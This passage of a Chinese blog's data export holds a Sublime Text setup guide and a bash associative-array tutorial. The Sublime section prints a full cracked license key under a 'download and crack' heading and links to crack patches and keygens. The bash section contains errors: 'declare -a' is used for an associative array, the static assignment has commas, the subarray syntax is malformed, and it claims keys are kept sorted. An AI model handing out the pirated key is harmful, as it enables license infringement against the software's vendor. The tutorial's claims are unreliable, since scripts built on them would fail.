代码提示</li>\n<li>JSHint、JsFormart、jQuery</li>\n<li>Color Highlighter</li>\n<li>Indent XML</li>\n<li>sublimeLinter</li>\n<li>pretty json</li>\n</ul>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://blog.csdn.net/xby1993/article/details/23995667\" target=\"_blank\" rel=\"external\">sublime Text3配置及快捷键、插件推荐总结</a></li>\n<li><a href=\"http://blog.useasp.net/archive/2013/06/14/sublime-text-2-all-default-Shortcuts-table-on-windows-translated-with-chinese.aspx\" target=\"_blank\" rel=\"external\">SublimeText2 快捷键一览表</a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/sublime.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><h3 id=\"1-下载与破解\"><a href=\"#1-下载与破解\" class=\"headerlink\" title=\"1. 下载与破解\"></a>1. 下载与破解</h3><p>当前可用的破解码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">—– BEGIN LICENSE —–</div><div class=\"line\">Andrew Weber</div><div class=\"line\">Single User License</div><div class=\"line\">EA7E-855605</div><div class=\"line\">813A03DD 5E4AD9E6 6C0EEB94 BC99798F</div><div class=\"line\">942194A6 02396E98 E62C9979 4BB979FE</div><div class=\"line\">91424C9D A45400BF F6747D88 2FB88078</div><div class=\"line\">90F5CC94 1CDC92DC 8457107A F151657B</div><div class=\"line\">1D22E383 A997F016 42397640 33F41CFC</div><div class=\"line\">E1D0AE85 A0BBD039 0E9C8D55 E1B89D5D</div><div class=\"line\">5CDB7036 E56DE1C0 EFCC0840 650CD3A6</div><div class=\"line\">B98FC99C 8FAC73EE D2B95564 DF450523</div><div class=\"line\">—— END LICENSE ——</div></pre></td></tr></table></figure></p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://www.xiumu.org/note/sublime-text-3.shtml\">Sublime Text 3 破解版 + 注册机 + 汉化包 + 教程</a></li>\n<li><a href=\"http://www.waitsun.com/sublime-text-3-for-mac.html\">Sublime Text 3 for Mac 3075 破解版 – Mac上强大的代码编辑神器</a></li>\n<li><a href=\"https://www.shuax.com/archives/SublimeText3Crack.html\">Sublime Text 3破解补丁</a></li>\n</ul>\n<h3 id=\"2-Sublime-Text-2与Sublime-Text-3区别\"><a href=\"#2-Sublime-Text-2与Sublime-Text-3区别\" class=\"headerlink\" title=\"2. Sublime Text 2与Sublime Text 3区别\"></a>2. Sublime Text 2与Sublime Text 3区别</h3><p>简单的说：</p>\n<ul>\n<li>ST3支持在项目目录里面寻找变量提供了</li>\n<li>对标签页更好地支持（更多的命令和快捷键）</li>\n<li>加快了程序运行的速度</li>\n<li>更新了API，使用Python3.3</li>\n</ul>\n<p>参见：</p>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/25078353\">Sublime Text3与Sublime Text 2的区别在哪里？</a></li>\n<li><a href=\"http://tutorial.jingwentian.com/Sublime-Text-3-Documentation/porting_guide.html\">Sublime Text 3 文档之迁移指南</a></li>\n</ul>\n<h2 id=\"二、配置\"><a href=\"#二、配置\" class=\"headerlink\" title=\"二、配置\"></a>二、配置</h2><h3 id=\"1-我的配置\"><a href=\"#1-我的配置\" class=\"headerlink\" title=\"1. 我的配置\"></a>1. 我的配置</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">\t\"ignored_packages\":</div><div class=\"line\">\t[</div><div class=\"line\">\t\t\"Vintage\"</div><div class=\"line\">\t],</div><div class=\"line\"></div><div class=\"line\">\t// 字体</div><div class=\"line\">\t\"font_size\": 12,</div><div class=\"line\"></div><div class=\"line\">\t// 高亮当前行</div><div class=\"line\">\t\"highlight_line\": true,</div><div class=\"line\"></div><div class=\"line\">\t// 新标签页打开文件</div><div class=\"line\">\t\"preview_on_click\": false,</div><div class=\"line\"></div><div class=\"line\">\t//滚动能否超过结尾</div><div class=\"line\">\t\"scroll_past_end\": false,</div><div class=\"line\"></div><div class=\"line\">\t// TAB缩进宽度</div><div class=\"line\">\t\"tab_size\": 4,</div><div class=\"line\"></div><div class=\"line\">\t// 自动转换TAB为空格</div><div class=\"line\">\t\"translate_tabs_to_spaces\": false,</div><div class=\"line\"></div><div class=\"line\">\t// 皮肤</div><div class=\"line\">\t\"theme\": \"Soda Dark 3.sublime-theme\",</div><div class=\"line\"></div><div class=\"line\">\t// 关闭自动更新</div><div class=\"line\">\t\"update_check\": false,</div><div class=\"line\"></div><div class=\"line\">\t// 自动换行</div><div class=\"line\">\t\"word_wrap\": \"true\"</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"2-关闭自动更新\"><a href=\"#2-关闭自动更新\" class=\"headerlink\" title=\"2. 关闭自动更新\"></a>2. 关闭自动更新</h3><p>SublimeText的升级挺快的，每次升级完之后都要重新破解一次主文件，不用重新注册，如果嫌更新太麻烦可以在用户配置中加入如下配置禁用自动更新：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">\"update_check\": false</div></pre></td></tr></table></figure></p>\n<h3 id=\"3-soda主题\"><a href=\"#3-soda主题\" class=\"headerlink\" title=\"3. soda主题\"></a>3. soda主题</h3><p>参见：<a href=\"https://github.com/buymeasoda/soda-theme/\">https://github.com/buymeasoda/soda-theme/</a></p>\n<p>通过package controller安装Theme - Soda。</p>\n<h3 id=\"4-记住打开的文件\"><a href=\"#4-记住打开的文件\" class=\"headerlink\" title=\"4. 记住打开的文件\"></a>4. 记住打开的文件</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">\"remember_open_files\": false</div></pre></td></tr></table></figure>","more":"<h3 id=\"5-Sublime-Text-2-使用-Eclipse-快捷键\"><a href=\"#5-Sublime-Text-2-使用-Eclipse-快捷键\" class=\"headerlink\" title=\"5. Sublime Text 2 使用 Eclipse 快捷键\"></a>5. Sublime Text 2 使用 Eclipse 快捷键</h3><p><a href=\"https://gist.github.com/ufologist/5590481#file-package-control-sublime-settings\">Sublime Text User Preferences – Eclipse shortcuts for Sublime Text</a><br><a href=\"http://www.douban.com/note/276794943/\">打造属于自己的前端开发神器 – 给Sublime Text加上Eclipse的光环</a></p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div></pre></td><td class=\"code\"><pre><div class=\"line\">[</div><div class=\"line\">    /**</div><div class=\"line\">     * 常用快捷键(Sublime默认)</div><div class=\"line\">     * --------------</div><div class=\"line\">     * </div><div class=\"line\">     * 光标一个单词一个单词的移动</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+left\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"by\"</span>: <span class=\"string\">\"words\"</span>, <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">false</span>&#125; &#125;,</div><div class=\"line\">     * 按住shift来选文字时, 一个个单词的选而不是一个个字母</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+left\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"by\"</span>: <span class=\"string\">\"words\"</span>, <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">false</span>, <span class=\"attr\">\"extend\"</span>: <span class=\"literal\">true</span>&#125; &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 类似光标一个个单词的移动</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+left\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"by\"</span>: <span class=\"string\">\"subwords\"</span>, <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">false</span>&#125; &#125;,</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+shift+right\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"by\"</span>: <span class=\"string\">\"subword_ends\"</span>, <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">true</span>, <span class=\"attr\">\"extend\"</span>: <span class=\"literal\">true</span>&#125; &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 缩进</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+]\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"indent\"</span> &#125;,</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+[\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"unindent\"</span> &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 删除整个单词</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+backspace\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"delete_word\"</span>, <span class=\"attr\">\"args\"</span>: &#123; <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">false</span> &#125; &#125;,</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+delete\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"delete_word\"</span>, <span class=\"attr\">\"args\"</span>: &#123; <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">true</span> &#125; &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 行排序(例如选中几个JSON字段, 让这些字段名按字母顺序排序)</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"f9\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"sort_lines\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"case_sensitive\"</span>: <span class=\"literal\">false</span>&#125; &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 参考</div><div class=\"line\">     * ----------------------</div><div class=\"line\">     * Using Sublime Text as your IDE</div><div class=\"line\">     * http://www.chromium.org/developers/sublime-text</div><div class=\"line\">     *</div><div class=\"line\">     * Web Development With Sublime Text <span class=\"number\">2</span></div><div class=\"line\">     * http://www.paulund.co.uk/web-development-with-sublime-text<span class=\"number\">-2</span></div><div class=\"line\">     */</div><div class=\"line\"></div><div class=\"line\">    // editor配置</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+v\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"paste_and_indent\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+v\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"paste\"</span> &#125;,</div><div class=\"line\"></div><div class=\"line\">    /**</div><div class=\"line\">     * 适配eclipse快捷键</div><div class=\"line\">     *</div><div class=\"line\">     * 下面这位仁兄早就有了这个想法</div><div class=\"line\">     * Eclipse shortcuts for Sublime Text <span class=\"number\">2</span></div><div class=\"line\">     * http://icoloma.blogspot.com/<span class=\"number\">2011</span>/<span class=\"number\">10</span>/eclipse-shortcuts-for-sublime-text<span class=\"number\">-2.</span>html</div><div class=\"line\">     */</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+/\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"auto_complete\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+i\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"reindent\"</span> &#125;,</div><div class=\"line\">    // 当前行和下面一行交互位置</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+up\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"swap_line_up\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+down\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"swap_line_down\"</span> &#125;,</div><div class=\"line\">    // 复制当前行到上一行</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+alt+up\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"duplicate_line\"</span> &#125;,</div><div class=\"line\">    // 复制当前行到下一行</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+alt+down\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"duplicate_line\"</span> &#125;,</div><div class=\"line\">    // 删除整行</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+d\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"run_macro_file\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"file\"</span>: <span class=\"string\">\"Packages/Default/Delete Line.sublime-macro\"</span>&#125; &#125;,</div><div class=\"line\">    // 光标移动到指定行</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+l\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"goto\"</span>, <span class=\"attr\">\"text\"</span>: <span class=\"string\">\":\"</span>&#125; &#125;,</div><div class=\"line\">    // 快速定位到选中的文字</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+k\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"find_under_expand_skip\"</span> &#125;,</div><div class=\"line\">    // &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+x\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"swap_case\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+x\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"upper_case\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+y\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"lower_case\"</span> &#125;,</div><div class=\"line\">    // 在当前行的下一行插入空行(这时鼠标可以在当前行的任一位置, 不一定是最后)</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"shift+enter\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"run_macro_file\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"file\"</span>: <span class=\"string\">\"Packages/Default/Add Line.sublime-macro\"</span>&#125; &#125;,</div><div class=\"line\">    // 定位到对于的匹配符(譬如&#123;&#125;)(从前面定位后面时,光标要在匹配符里面,后面到前面,则反之)</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+p\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move_to\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"to\"</span>: <span class=\"string\">\"brackets\"</span>&#125; &#125;,</div><div class=\"line\">    // 这个命令默认使用的是super+shift+p</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+p\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"command_palette\"</span>&#125; &#125;,</div><div class=\"line\">    // outline</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+o\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"goto\"</span>, <span class=\"attr\">\"text\"</span>: <span class=\"string\">\"@\"</span>&#125; &#125;,</div><div class=\"line\">    // 当前文件中的关键字(方便快速查找内容)</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+alt+o\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"goto\"</span>, <span class=\"attr\">\"text\"</span>: <span class=\"string\">\"#\"</span>&#125; &#125;,</div><div class=\"line\">    // open resource</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+r\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"goto\"</span>, <span class=\"attr\">\"show_files\"</span>: <span class=\"literal\">true</span>&#125; &#125;,</div><div class=\"line\">    // 文件内查找/替换</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+f\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_panel\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"panel\"</span>: <span class=\"string\">\"replace\"</span>&#125; &#125;,</div><div class=\"line\">    // 全局查找/替换, 在查询结果中双击跳转到匹配位置</div><div class=\"line\">    &#123;<span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+h\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_panel\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"panel\"</span>: <span class=\"string\">\"find_in_files\"</span>&#125; &#125;,</div><div class=\"line\"></div><div class=\"line\">    // plugin配置</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+a\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"alignment\"</span> &#125;,</div><div class=\"line\">    &#123;<span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+f\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"js_format\"</span>&#125;</div><div class=\"line\">]</div></pre></td></tr></table></figure>\n<h2 id=\"三、插件\"><a href=\"#三、插件\" class=\"headerlink\" title=\"三、插件\"></a>三、插件</h2><h3 id=\"1-Package-Control\"><a href=\"#1-Package-Control\" class=\"headerlink\" title=\"1. Package Control\"></a>1. Package Control</h3><p>最简单的方式是通过 ctrl+`快捷键打开控制台，粘贴以下代码到控制台执行。<br>参见：<a href=\"https://packagecontrol.io/installation#st3\">Package Control INSTALLATION</a></p>\n<h4 id=\"Sublime-Text-3\"><a href=\"#Sublime-Text-3\" class=\"headerlink\" title=\"Sublime Text 3\"></a>Sublime Text 3</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> urllib.request,os,hashlib; h = <span class=\"string\">'2915d1851351e5ee549c20394736b442'</span> + <span class=\"string\">'8bc59f460fa1548d1514676163dafc88'</span>; pf = <span class=\"string\">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( <span class=\"string\">'http://packagecontrol.io/'</span> + pf.replace(<span class=\"string\">' '</span>, <span class=\"string\">'%20'</span>)).read(); dh = hashlib.sha256(by).hexdigest(); print(<span class=\"string\">'Error validating download (got %s instead of %s), please try manual install'</span> % (dh, h)) <span class=\"keyword\">if</span> dh != h <span class=\"keyword\">else</span> open(os.path.join( ipp, pf), <span class=\"string\">'wb'</span> ).write(by)</div></pre></td></tr></table></figure>\n<h4 id=\"Sublime-Text-2\"><a href=\"#Sublime-Text-2\" class=\"headerlink\" title=\"Sublime Text 2\"></a>Sublime Text 2</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> urllib2,os,hashlib; h = <span class=\"string\">'2915d1851351e5ee549c20394736b442'</span> + <span class=\"string\">'8bc59f460fa1548d1514676163dafc88'</span>; pf = <span class=\"string\">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(ipp) <span class=\"keyword\">else</span> <span class=\"keyword\">None</span>; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( <span class=\"string\">'http://packagecontrol.io/'</span> + pf.replace(<span class=\"string\">' '</span>, <span class=\"string\">'%20'</span>)).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), <span class=\"string\">'wb'</span> ).write(by) <span class=\"keyword\">if</span> dh == h <span class=\"keyword\">else</span> <span class=\"keyword\">None</span>; print(<span class=\"string\">'Error validating download (got %s instead of %s), please try manual install'</span> % (dh, h) <span class=\"keyword\">if</span> dh != h <span class=\"keyword\">else</span> <span class=\"string\">'Please restart Sublime Text to finish installation'</span>)</div></pre></td></tr></table></figure>\n<h3 id=\"2-实用插件\"><a href=\"#2-实用插件\" class=\"headerlink\" title=\"2. 实用插件\"></a>2. 实用插件</h3><ul>\n<li>SideBarEnhancements左侧菜单栏增强</li>\n<li>ConvertToUTF8</li>\n<li>AutoFileName自动补全文件(目录)名</li>\n<li>BracketHighlighter突出显示括号/引号</li>\n<li>ColorHighlighter 背景显示16进制颜色</li>\n<li>DocBlockr 生成注释模板</li>\n<li>Sublime CodeIntel – 智能代码提示</li>\n<li>FreeMarker:Freemarker模板语言辅助</li>\n<li>SublimeCodeIntel 代码提示</li>\n<li>JSHint、JsFormart、jQuery</li>\n<li>Color Highlighter</li>\n<li>Indent XML</li>\n<li>sublimeLinter</li>\n<li>pretty json</li>\n</ul>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://blog.csdn.net/xby1993/article/details/23995667\">sublime Text3配置及快捷键、插件推荐总结</a></li>\n<li><a href=\"http://blog.useasp.net/archive/2013/06/14/sublime-text-2-all-default-Shortcuts-table-on-windows-translated-with-chinese.aspx\">SublimeText2 快捷键一览表</a></li>\n</ul>"},{"title":"shell关联数组基本用法","date":"2016-02-01T04:35:00.000Z","_content":"\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n**注**：bash自版本4后才开始支持关联数组，之前的版本可以考虑通过二维数组来代替。\n\n\n## 一、基本用法\n\n### 1. 数组声明\n``` bash\ndeclare -a arr\n```\n\n\n### 2. 数组赋值\n\n#### 静态赋值\n``` bash\narr=([A]=A1, [C]=C2, [E]=E3, [B]=B411, [b]=b5)\n```\n\n#### 动态赋值\n``` bash\narr[\"A\"]=A1\narr[\"C\"]=C2\narr[\"E\"]=E3\narr[\"B\"]=B411\narr[\"b\"]=b5\n```\n\n\n### 3. 数组遍历\n\n#### 数组索引(键)\n格式：`${!arr[@]}` 或 `${!arr[*]}`\n\n#### 数组内容(值)\n格式：`${arr[@]}` 或 `${arr[*]}`\n\n\n### 4. 数组长度\n格式：\n``` bash\n${#变量}\n```\n该变量若为数组，则为数组长度；若为普通变量，则为普通变量长度。\n\n数组长度：\n``` bash\n${#arr[@]}\n${#arr[*]}\n```\n数组元素长度：\n``` bash\n${#arr[2]}\n```\n\n\n### 5. 子数组\n格式：\n``` bash\n${#arr:index:end}\n```\n\n\n<!-- more -->\n\n\n## 二、举例\n\n### 1. 实例脚本\n``` bash\n#/bin/bash\n\ndeclare -A arr\n\narr[\"A\"]=A1\narr[\"C\"]=C2\narr[\"E\"]=E3\narr[\"B\"]=B411\narr[\"b\"]=b5\n\n\n# 数组长度\necho -e '数组长度${#arr[@]}:\\t'${#arr[@]};\necho -e '数组长度${#arr[@]:1:4}:\\t'${#arr[@]:1:4};\necho -e '单个元素长度${#arr[C]}:\\t'${#arr[C]};\necho -e '单个元素长度${#arr[B]}:\\t'${#arr[B]};\necho -e '';\n\n# 数组\necho -e '数组索引${!arr[@]}:\\t'${!arr[@]};\necho -e '全部数组内容${arr[@]}:\\t'${arr[@]};\necho -e '';\n\n# 数组子串\necho -e '数组子串${arr[@]:2}:\\t'${arr[@]:2};\necho -e '数组子串${arr[@]:1:4}:\\t'${arr[@]:1:4};\necho -e '';\n\n# 数组值\necho -e '数组值${arr[b]}:\\t'${arr[b]};\necho -e '数组值${arr[C]}:\\t'${arr[C]};\necho -e '数组值(大小写敏感)${arr[c]}:\\t'${arr[c]};\n```\n\n\n### 2. 实例输出\n``` bash\n数组长度${#arr[@]}:\t5\n数组长度${#arr[@]:1:4}:\t5\n单个元素长度${#arr[C]}:\t2\n单个元素长度${#arr[B]}:\t4\n\n数组索引${!arr[@]}:\tA B C E b\n全部数组内容${arr[@]}:\tA1 B411 C2 E3 b5\n\n数组子串${arr[@]:2}:\tB411 C2 E3 b5\n数组子串${arr[@]:1:4}:\tA1 B411 C2 E3\n\n数组值${arr[b]}:\tb5\n数组值${arr[C]}:\tC2\n数组值(大小写敏感)${arr[c]}:\n```\n\n\n## 三、附加知识\n\n### 1. 内部域分隔符IFS\nshell里默认使用空格、制表符以及换行为分隔符。\n\n### 2. 数组转换\n字符串可通过()默认通过IFS将字符串直接转换成数组。\n``` bash\nyerba-buena:tmp yeshaoting$ str=\"1 3 2 7 5\"\nyerba-buena:tmp yeshaoting$ arr=($str)\nyerba-buena:tmp yeshaoting$ echo ${arr[@]}\n1 3 2 7 5\nyerba-buena:tmp yeshaoting$ echo ${!arr[@]}\n0 1 2 3 4\n```\n\n### 3. 数组键大小写敏感\n`${arr[C]}`取值为C2，`${arr[c]}`则为空。\n另外，键加不加引号都一样，引号可用于拼接键值操作。\n\n### 4. 关联数组键有序\n关联数组依键有序，与插入数组顺序无关。如上例中数组输出结果为：A1 B411 C2 E3 b5。\n\n### 5. 